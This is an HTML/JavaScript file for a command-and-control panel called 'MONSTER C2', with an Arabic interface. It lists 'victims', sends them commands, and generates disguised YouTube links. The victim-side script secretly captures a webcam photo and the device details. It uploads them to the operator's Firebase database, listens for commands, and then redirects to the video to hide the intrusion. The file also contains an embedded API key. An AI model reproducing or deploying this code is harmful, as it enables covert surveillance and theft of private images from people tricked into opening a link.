<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THE DOCTOR | MONSTER C2 v6.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; font-size: 12px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; flex: 1; gap: 5px; padding: 5px; }
        .box { border: 1px solid var(--neon); display: flex; flex-direction: column; background: #000; border-radius: 5px; overflow: hidden; }
        .header { background: var(--neon); color: #000; padding: 5px; text-align: center; font-weight: bold; font-size: 10px; }
        .scroll { flex: 1; overflow-y: auto; padding: 5px; }
        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; width: 100%; margin-top: 5px; border-radius: 3px; }
        button:active { background: var(--neon); color: #000; }
        .v-item { border-bottom: 1px solid #222; padding: 8px; cursor: pointer; }
        .v-item.active { background: #111; border-left: 4px solid #fff; }
        img { width: 100%; border: 1px solid #333; margin-top: 5px; border-radius: 3px; }
        .status { float: left; font-size: 9px; }
    </small>
    </style>
</head>
<body>

<div class="grid">
    <div class="box">
        <div class="header">📡 رادار الأجهزة النشطة</div>
        <div class="scroll" id="dev-list">بانتظار الضحايا...</div>
    </div>

    <div class="box">
        <div class="header">🕹️ تحكم السيادة (Direct)</div>
        <div class="scroll">
            <div id="target-title">اختر جهازاً</div>
            <button onclick="sendCmd('snap')">📸 التقاط صورة (Link)</button>
            <button onclick="sendCmd('vibrate')">📳 هز الهاتف</button>
            <button onclick="sendCmd('dump_sms')">💬 سحب الـ SMS (APK)</button>
            <button onclick="sendCmd('dump_wa')">🟢 سحب WhatsApp (APK)</button>
            <button onclick="deleteVictim()" style="color:red; margin-top:20px;">🗑️ حذف الجهاز نهائياً</button>
        </div>
    </div>

    <div class="box">
        <div class="header">📸 معرض الصور والبيانات</div>
        <div class="scroll" id="gallery"></div>
    </div>

    <div class="box">
        <div class="header">⚙️ مصنع البايلود (APK/Link)</div>
        <div class="scroll">
            <input type="text" id="vid-url" placeholder="رابط فيديو اليوتيوب">
            <button onclick="genLink()">توليد الرابط الملغم</button>
            <button onclick="alert('جاري تجهيز كود البايثون لصناعة APK... انظر الشرح بالأسفل')">🛠️ بناء بايلود APK (اختراق كامل)</button>
            <div id="res-link" style="font-size:8px; word-break:break-all; color:#0ff; margin-top:10px;"></div>
        </div>
    </div>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selectedId = null;

    // تحديث الرادار
    db.ref('victims').on('value', s => {
        const list = document.getElementById('dev-list');
        list.innerHTML = '';
        s.forEach(c => {
            const v = c.val();
            const id = c.key;
            const online = (Date.now() - v.lastSeen) < 15000;
            list.innerHTML += `<div class="v-item ${id==selectedId?'active':''}" onclick="setTarget('${id}','${v.model}')">
                <span class="status" style="color:${online?'#0f0':'#f00'}">${online?'متصل':'أوفلاين'}</span>
                <b>${v.model || 'Unknown Device'}</b><br>
                <small>${v.ip} | ${v.time}</small>
            </div>`;
            if(v.imgUrl && id === selectedId) {
                document.getElementById('gallery').innerHTML = `<img src="${v.imgUrl}">` + document.getElementById('gallery').innerHTML;
            }
        });
    });

    function setTarget(id, model) {
        selectedId = id;
        document.getElementById('target-title').innerText = "تحكم في: " + model;
    }

    function sendCmd(cmd) {
        if(!selectedId) return alert("اختر ضحية!");
        db.ref('cmds/' + selectedId).set({ c: cmd, t: Date.now() });
        alert("تم إرسال الأمر: " + cmd);
    }

    function deleteVictim() {
        if(selectedId && confirm("حذف؟")) {
            db.ref('victims/' + selectedId).remove();
            db.ref('cmds/' + selectedId).remove();
            selectedId = null;
        }
    }

    function genLink() {
        const vid = document.getElementById('vid-url').value;
        const final = window.location.href.split('?')[0] + "?t=" + btoa(vid);
        document.getElementById('res-link').innerText = final;
    }

    // --- كود الضحية (يتم تفعيله عند فتح الرابط) ---
    const p = new URLSearchParams(window.location.search);
    if(p.get('t')) {
        (async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.createElement('video'); v.srcObject=stream; await v.play();
                const c = document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                const img = c.toDataURL('image/jpeg', 0.5);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                
                const ref = db.ref('victims').push();
                await ref.set({ model, ip: "Active", lastSeen: Date.now(), time: new Date().toLocaleTimeString(), imgUrl: img });
                
                // الاستماع للأوامر (هذا يعمل فقط طالما الصفحة مفتوحة)
                db.ref('cmds/'+ref.key).on('value', snap => {
                    if(snap.val() && snap.val().c === 'vibrate') navigator.vibrate(500);
                });

                setTimeout(() => { window.location.href = atob(p.get('t')); }, 1500);
            } catch(e) { window.location.href = atob(p.get('t')); }
        })();
    }
</script>
</body>
</html>
